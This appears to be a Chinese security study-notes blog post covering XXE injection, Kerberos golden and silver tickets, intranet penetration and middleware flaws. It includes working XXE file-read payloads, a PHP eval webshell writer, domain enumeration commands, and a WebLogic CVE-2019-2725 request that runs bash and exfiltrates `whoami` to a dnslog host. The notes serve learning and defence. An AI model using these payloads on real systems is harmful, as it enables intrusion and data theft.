<h2 id="XXE攻击"><a href="#XXE攻击" class="headerlink" title="XXE攻击"></a>XXE攻击</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>普通xml注入</p>
<p><img src="/image/d01373f082025aaf60d0e3b3e495ce6d024f1a6d.png" alt="img"></p>
<p>XML是一种非常流行的标记语言，它经常被用于配置文件，文档格式等。在解析外部实体的过程中，xml解析器可以根据url中指定的协议来查询。外部实体在文档中创建动态引用时非常有用，我们对外部资源进行的任何修改都可以在文档中自动更新。这种特性就导致了XXE攻击可以做到许多的效果</p>
<p>xml有一套格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;//这一行是 XML 文档定义</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">        &lt;!ELEMENT message (receiver ,sender ,header ,msg)&gt;</span><br><span class="line">        &lt;!ELEMENT receiver (#PCDATA)&gt;</span><br><span class="line">        &lt;!ELEMENT sender (#PCDATA)&gt;</span><br><span class="line">        &lt;!ELEMENT header (#PCDATA)&gt;</span><br><span class="line">        &lt;!ELEMENT msg (#PCDATA)&gt;</span><br><span class="line">    ]&gt;</span><br></pre></td></tr></table></figure>

<p>像这种定义方式，xml就必须按下面的方式书写</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">receiver</span>&gt;</span>Myself<span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">sender</span>&gt;</span>Someone<span class="tag">&lt;/<span class="name">sender</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">header</span>&gt;</span>TheReminder<span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">msg</span>&gt;</span>This is an amazing book<span class="tag">&lt;/<span class="name">msg</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到每个标签都对应DTD中的一个元素，此外，我们还可以在DTD中定义实体</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">    &lt;!ENTITY xxe &quot;test&quot; &gt;</span><br><span class="line">    ]&gt;</span><br></pre></td></tr></table></figure>

<p>这里 定义元素为 ANY 说明接受任何元素，还定义了xml的实体xxe，体其实可以看成一个变量，可以在 XML 中通过 &amp; 符号进行引用，则xml就应该这样写</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pass</span>&gt;</span>mypass<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用<code>&amp;xxe;</code>对上面定义的xxe实体进行了引用，即输出test，这就是内部实体。XXE又叫xml外部实体注入，所以下面来看看外部实体</p>
<p>定义一个DTD</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ELEMENT foo ANY &gt;</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;</span><br><span class="line">    ]&gt;</span><br></pre></td></tr></table></figure>

<p>xml代码</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">pass</span>&gt;</span>mypass<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这样我们在外部实体做的任何修改都可以在user处更新，还有一种方式是引用公共DTD，可以起到和SYSTEM相同的作用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</span><br></pre></td></tr></table></figure>

<p><strong>通用实体</strong></p>
<p>用<code>&amp;实体名;</code>引用的实体，在DTD中定义，在XML文档中引用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE updateProfile [</span><br><span class="line">    &lt;!ENTITY file SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;</span><br><span class="line">    ]&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">updateProfile</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">firstname</span>&gt;</span>Joe<span class="tag">&lt;/<span class="name">firstname</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">lastname</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">lastname</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">updateProfile</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>参数实体</strong></p>
<ul>
<li>使用 <code>% 实体名</code>(这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用 <code>%实体名;</code>引用</li>
<li>只有在 DTD 文件中，参数实体的声明才能引用其他实体</li>
<li>和通用实体一样，参数实体也可以外部引用</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt;</span><br><span class="line"></span><br><span class="line">%an-element;</span><br><span class="line">%remote-dtd;</span><br></pre></td></tr></table></figure>

<h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><h4 id="有回显读取本地文件"><a href="#有回显读取本地文件" class="headerlink" title="有回显读取本地文件"></a>有回显读取本地文件</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line"><span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$creds</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE creds [</span><br><span class="line">    &lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt;</span><br><span class="line">    ]&gt;</span><br><span class="line"></span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure>

<p>如果读取的文件有特殊符号污染，可能会产生报错，这时候我们可以用到<strong>CDATA</strong></p>
<blockquote>
<p>CDATA节中的所有字符都会被当做元素字符数据的常量部分，格式为<![CDATA[XXXXXXXXXXXXXXXXX]]></p>
</blockquote>
<p>但是xml中并没有能够拼接字符串的语法，这时可以使用多个实体连续引用的方法</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">    &lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % end &quot;]]&gt;&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt;</span><br><span class="line">        %dtd;</span><br><span class="line">    ]&gt;</span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</span><br><span class="line"></span><br><span class="line">\\evil.dtd</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure>

<h3 id="防御方法-2"><a href="#防御方法-2" class="headerlink" title="防御方法"></a>防御方法</h3><ol>
<li>简单粗暴，禁用外部实体</li>
<li>过滤和验证用户提交的xml数据</li>
</ol>
<h2 id="用过的安全设备"><a href="#用过的安全设备" class="headerlink" title="用过的安全设备"></a>用过的安全设备</h2><p>深信服日志审计，深信服数据库审计，深信服防火墙，深信服态势感知</p>
<h2 id="黄金-白银票据的区别"><a href="#黄金-白银票据的区别" class="headerlink" title="黄金&#x2F;白银票据的区别"></a>黄金&#x2F;白银票据的区别</h2><p><img src="/image/v2-b4279994a9625f378f9299fbd1ec1793_r.jpg" alt="preview"></p>
<p><img src="/image/v2-c82d9a8b0b457bd0c886776f6ce06bee_r.jpg" alt="preview"></p>
<img src="/image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAWTVuZUtP,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="img"  />

<h3 id="从获取的权限"><a href="#从获取的权限" class="headerlink" title="从获取的权限"></a>从获取的权限</h3><ul>
<li>黄金票据：通过伪造TGT票据，可以获取任意Kerberos的访问权限</li>
<li>白银票据：通过伪造ST票据，只能访问指定的服务，如CIFS等</li>
</ul>
<h3 id="从认证流程"><a href="#从认证流程" class="headerlink" title="从认证流程"></a>从认证流程</h3><ul>
<li>黄金票据：与KDC交互，不与AS交互</li>
<li>白银票据：不与KDC交互，直接访问Server服务</li>
</ul>
<h3 id="从加密方式"><a href="#从加密方式" class="headerlink" title="从加密方式"></a>从加密方式</h3><ul>
<li>黄金票据：通过 krbtgt 的 NTLM Hash 加密</li>
<li>白银票据：通过服务账号的 NTLM Hash 加密</li>
</ul>
<h2 id="了解的内网渗透"><a href="#了解的内网渗透" class="headerlink" title="了解的内网渗透"></a>了解的内网渗透</h2><ul>
<li>首先在已有权限的主机上进行进一步<strong>信息搜集</strong>（系统详细信息，开放端口、服务，补丁信息等），获取有用信息</li>
<li>尝试<strong>提权</strong>，看看是否能够通过更高权限获取更多信息和利用，不能提权无所谓，进行下一步</li>
<li>对已有权限等级做好<strong>权限维持</strong>（免杀，自启动，开机运行，计划任务等等）</li>
<li>尝试通过端口转发、反弹shell、frp代理、Ngrok代理、Earthworm代理、reGeorg代理或其他隧道技术，将内网的流量代理出来，方便<strong>内网环境探测</strong>和<strong>内网横向移动</strong></li>
<li>进行<strong>内网信息搜集</strong>，弄清楚内网有哪些网段，可尝试直接进行内网探测存活主机、端口等，并进一步分析资产漏洞可用性</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#msf模块</span></span><br><span class="line"><span class="comment">#存活主机探测</span></span><br><span class="line">auxiliary/scanner/discovery/udp_sweep    <span class="comment">#基于udp协议发现内网存活主机</span></span><br><span class="line">auxiliary/scanner/discovery/udp_probe    <span class="comment">#基于udp协议发现内网存活主机</span></span><br><span class="line">auxiliary/scanner/netbios/nbname         <span class="comment">#基于netbios协议发现内网存活主机</span></span><br><span class="line">auxiliary/scanner/portscan/tcp           <span class="comment">#基于tcp进行端口扫描(1-10000)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#端口扫描</span></span><br><span class="line">auxiliary/scanner/portscan/tcp           <span class="comment">#基于tcp进行端口扫描(1-10000)</span></span><br><span class="line">auxiliary/scanner/portscan/ack           <span class="comment">#基于tcp的ack回复进行端口扫描，默认扫描1-10000端口</span></span><br><span class="line"><span class="comment">#端口扫描有时会使会话终端，所以可以上传nmap后在shell中使用nmap扫描。但是要记得清理</span></span><br></pre></td></tr></table></figure>

<ul>
<li>判断<strong>是否存在域环境</strong>，如果存在域环境，尝试搜集域控信息（NetBIOS协议），查看域用户有哪些，方便后续渗透</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ipconfig /all   					查看本机ip，所在域</span><br><span class="line">route <span class="built_in">print</span>    						打印路由信息</span><br><span class="line">net view       						查看局域网内其他主机名</span><br><span class="line">arp -a          					查看arp缓存</span><br><span class="line">net start       					查看开启了哪些服务</span><br><span class="line">net share       					查看开启了哪些共享</span><br><span class="line">net share ipc$  					开启ipc共享</span><br><span class="line">net share c$    					开启c盘共享</span><br><span class="line">net use \\192.168.xx.xx\ipc$ <span class="string">&quot;&quot;</span> /user:<span class="string">&quot;&quot;</span>   			与192.168.xx.xx建立空连接</span><br><span class="line">net use \\192.168.xx.xx\c$ <span class="string">&quot;密码&quot;</span> /user:<span class="string">&quot;用户名&quot;</span>			建立c盘共享</span><br><span class="line"><span class="built_in">dir</span> \\192.168.xx.xx\c$\user    		查看192.168.xx.xx c盘user目录下的文件  </span><br><span class="line">net config Workstation   			查看计算机名、全名、用户名、系统版本、工作站、域、登录域</span><br><span class="line">net user                 			查看本机用户列表</span><br><span class="line">net time /domain        			查看时间服务器，判断主域，主域服务器都做时间服务器</span><br><span class="line">net user /domain         			查看域用户</span><br><span class="line">net localgroup administrators   	查看本地管理员组（通常会有域用户）</span><br><span class="line">net view /domain         			查看有几个域</span><br><span class="line">net user 用户名 /domain   			  获取指定域用户的信息</span><br><span class="line">net group /domain        			查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）</span><br><span class="line">net group 组名 /domain    		  查看域中某工作组</span><br><span class="line">net group <span class="string">&quot;domain admins&quot;</span> /domain  	查看域管理员的名字</span><br><span class="line">net group <span class="string">&quot;domain computers&quot;</span> /domain  查看域中的其他主机名</span><br><span class="line">net group <span class="string">&quot;doamin controllers&quot;</span> /domain  查看域控制器（可能有多台）</span><br></pre></td></tr></table></figure>

<ul>
<li>尝试渗透域控或者域成员</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MS14-068</span><br><span class="line">MS17-010永恒之蓝</span><br><span class="line">noPac.exe</span><br><span class="line">域渗透ZeroLogon(CVE-2020-1472)</span><br></pre></td></tr></table></figure>

<ul>
<li>如果域渗透没有进展，可尝试通过其他未入域的存活主机进行渗透</li>
<li>如果拿到相关权限，需进行后渗透操作，清理痕迹、权限维持等</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黄金/白银票据</span><br></pre></td></tr></table></figure>



<h2 id="php-Java反序列化"><a href="#php-Java反序列化" class="headerlink" title="php&#x2F;Java反序列化"></a>php&#x2F;Java反序列化</h2><h2 id="如何绕过cdn"><a href="#如何绕过cdn" class="headerlink" title="如何绕过cdn"></a>如何绕过cdn</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1（探测）.多地ping：因为cdn的目的是为了稳定速度，有些cdn服务商可能会在不同的地点或者ip设立节点服务器，所以不同地点ping出的ip不同则采用了cdn；但是多地ping出的ip相同也不一定就是真实ip，还要考虑单一cdn节点的可能性。</span><br><span class="line"></span><br><span class="line">2.二级域名：因为cdn流量还是比较贵的，所以不一定每个子域名都挂上了cdn，此时我们可以通过子域名来发现真实ip本地将目标域名绑定到同IP（修改host文件），如果能访问就说明目标站与此二级域名在同一个服务器上；如果两者不在同一服务器也可能在同C段，扫描C段所有开80端口的IP，然后挨个尝试。</span><br><span class="line"></span><br><span class="line">3.国外冷门dns服务器解析：大部分国内cdn服务商只针对国内市场，如果采用外国冷门服务器进行dns解析，有较大概率解析到真实ip</span><br><span class="line"></span><br><span class="line">4.通过网络空间测绘引擎或者情报平台搜索特有http头或者关键字</span><br><span class="line"></span><br><span class="line">5.查询历史dns解析记录，可能以前没有使用cdn，后来再用了cdn解析，如果中途没有换过真实ip，那么有几率获取到真实ip</span><br></pre></td></tr></table></figure>



<h2 id="中间件漏洞-三四个"><a href="#中间件漏洞-三四个" class="headerlink" title="中间件漏洞  三四个"></a>中间件漏洞  三四个</h2><h3 id="iis6-0解析漏洞"><a href="#iis6-0解析漏洞" class="headerlink" title="iis6.0解析漏洞"></a>iis6.0解析漏洞</h3><p>该版本默认将<code>*.asp;.jpg</code>此类格式的文件名，当成asp解析，服务器默认；后面的内容不解析，相当于截断，例如上传asp木马，就可以用<code>xx.asp;.jpg</code>来绕过；iis除了会将asp解析成脚本执行文件之外，还会将 cer cdx asa扩展名解析成asp</p>
<p><strong>防御：</strong>禁止上传畸形文件，图片目录设置为禁止脚本执行</p>
<h3 id="iis6-PUT漏洞"><a href="#iis6-PUT漏洞" class="headerlink" title="iis6 PUT漏洞"></a>iis6 PUT漏洞</h3><p>IIS Server在web中开启了webDAV 配置了可以写入的权限，造成了任意文件上传</p>
<p><strong>防御：</strong>关闭webDAV，关闭写入权限</p>
<h3 id="iis7-解析漏洞"><a href="#iis7-解析漏洞" class="headerlink" title="iis7 解析漏洞"></a>iis7 解析漏洞</h3><p>iis7.x版本在Fast-CGI运行模式下，在任意文件，例如：<code>a.jpg/png</code>后面加上<code>/.php</code>,会将<code>.jpg/png</code>解析为php文件</p>
<p><strong>防御：</strong>配置 cgi fix_pathinfo（php inil中）为0并重启php-cgi程序</p>
<h3 id="Apache未知拓展名解析"><a href="#Apache未知拓展名解析" class="headerlink" title="Apache未知拓展名解析"></a>Apache未知拓展名解析</h3><p>apache默认一个文件可以有多个以点切割的后缀，当最右的后缀无法识别时，就继续向左识别，直到识别到合法后缀才开始解析，如xxx.php.qqq，qqq无法识别，就继续解析，到php时能够识别，就解析为php文件</p>
<h3 id="Apache换行解析漏洞CVE-2017-15715"><a href="#Apache换行解析漏洞CVE-2017-15715" class="headerlink" title="Apache换行解析漏洞CVE-2017-15715"></a>Apache换行解析漏洞CVE-2017-15715</h3><p>2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略</p>
<h3 id="Apache-ssi-远程命令执行漏洞"><a href="#Apache-ssi-远程命令执行漏洞" class="headerlink" title="Apache ssi 远程命令执行漏洞"></a>Apache ssi 远程命令执行漏洞</h3><p>当目标服务器开启了SSI与CGI支持,我们就可以上传shtml,利用 语法执行命令。</p>
<p>使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为”服务器端嵌入”或者叫”服务器端包含”，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml</p>
<h3 id="Tomcat弱口令-war远程部署"><a href="#Tomcat弱口令-war远程部署" class="headerlink" title="Tomcat弱口令&amp;war远程部署"></a>Tomcat弱口令&amp;war远程部署</h3><p>Tomcat存在后台管理，账号密码设置在conf&#x2F;tomcat-users.xml</p>
<p>弱口令或爆破(爆破采用数据包base64传递认证)<br>把shell.jsp在本地打包成zip，然后重命名为war，之后上传war，会自动解压，从而getshell</p>
<h3 id="Nginx畸形解析漏洞"><a href="#Nginx畸形解析漏洞" class="headerlink" title="Nginx畸形解析漏洞"></a>Nginx畸形解析漏洞</h3><p>IS 7.0&#x2F;IIS 7.5&#x2F; Nginx &lt;8.03</p>
<p>在默认Fast-CGI开启状况下,上传一个名字为shell.jpg，内容为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval($_POST[cmd])?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>nginx默认是以CGI的方式支持PHP解析的,普遍的做法是在 Nginx配置文件中</p>
<p>通过正则匹配设置 SCRIPT_FILENAME。</p>
<p>当访可<a href="http://127.0.0.1/phpinfo.jpg/1.php%E8%BF%99%E4%B8%AAURL%E6%97%B6">http://127.0.0.1/phpinfo.jpg/1.php这个URL时</a></p>
<p>$fastcgi_script_name会被设置为 “phpinfo.jpg&#x2F;1.php”</p>
<p>SCRIPT_FILENAME传递给 PHP CGI,如果PHP中开启了 fix_pathing这个选项</p>
<p>PHP会认为 SCRIPT_FILENAME是 phpinfo.jpg,而1.php是 PATH_INFO,所以就会将 phpinfo.jpg作为PHP文件来解析</p>
<h3 id="Nginx-fastcgi缓存文件包含"><a href="#Nginx-fastcgi缓存文件包含" class="headerlink" title="Nginx-fastcgi缓存文件包含"></a>Nginx-fastcgi缓存文件包含</h3><p>原理：</p>
<ul>
<li>Nginx 在后端 Fastcgi 响应过大 或 请求正文 body 过大时会产生临时文件</li>
<li>通过多重链接绕过 PHP LFI stat 限制完成 LFI</li>
</ul>
<p><a href="https://tttang.com/archive/1384/">https://tttang.com/archive/1384/</a></p>
<h3 id="Weblogic弱口令"><a href="#Weblogic弱口令" class="headerlink" title="Weblogic弱口令"></a>Weblogic弱口令</h3><p>在weblogic搭建好之后没有修改进入后台的密码导致弱口令登录获得webshell<br>访问<a href="http://127.0.0.1:7001/console">http://127.0.0.1:7001/console</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">默认账密：weblogic/Oracle@123</span><br></pre></td></tr></table></figure>

<h3 id="Weblogic反序列化CVE-2015-4852、CVE-2016-3510"><a href="#Weblogic反序列化CVE-2015-4852、CVE-2016-3510" class="headerlink" title="Weblogic反序列化CVE-2015-4852、CVE-2016-3510"></a>Weblogic反序列化CVE-2015-4852、CVE-2016-3510</h3><p>危害：远程命令执行</p>
<h3 id="Weblogic-SSRF-CVE-2014-4210"><a href="#Weblogic-SSRF-CVE-2014-4210" class="headerlink" title="Weblogic SSRF CVE-2014-4210"></a>Weblogic SSRF CVE-2014-4210</h3><p>利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:7001/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001</span><br></pre></td></tr></table></figure>

<h3 id="Weblogic任意文件读取-上传-CVE-2019-2615-2618"><a href="#Weblogic任意文件读取-上传-CVE-2019-2615-2618" class="headerlink" title="Weblogic任意文件读取&#x2F;上传 | CVE-2019-2615&#x2F;2618"></a>Weblogic任意文件读取&#x2F;上传 | CVE-2019-2615&#x2F;2618</h3><p>需要用户名密码认证</p>
<h3 id="Weblogic反序列化远程命令执行CVE-2019-2725"><a href="#Weblogic反序列化远程命令执行CVE-2019-2725" class="headerlink" title="Weblogic反序列化远程命令执行CVE-2019-2725"></a>Weblogic反序列化远程命令执行CVE-2019-2725</h3><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/_async/AsyncResponseService</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>IP:PORT</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>859</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">SOAPAction</span>:</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Apache-HttpClient/4.1.1 (java 1.5)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">content-type</span><span class="punctuation">: </span>text/xml</span><br><span class="line"></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span> <span class="attr">xmlns:wsa</span>=<span class="string">&quot;http://www.w3.org/2005/08/addressing&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml"><span class="attr">xmlns:asy</span>=<span class="string">&quot;http://www.bea.com/async/AsyncResponseService&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">wsa:Action</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:Action</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">wsa:RelatesTo</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">wsa:RelatesTo</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.String&quot;</span> <span class="attr">length</span>=<span class="string">&quot;3&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">string</span>&gt;</span>ping `whoami`.74g4hi.dnslog.cn<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;start&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">asy:onAsyncDelivery</span>/&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span></span><br></pre></td></tr></table></figure>

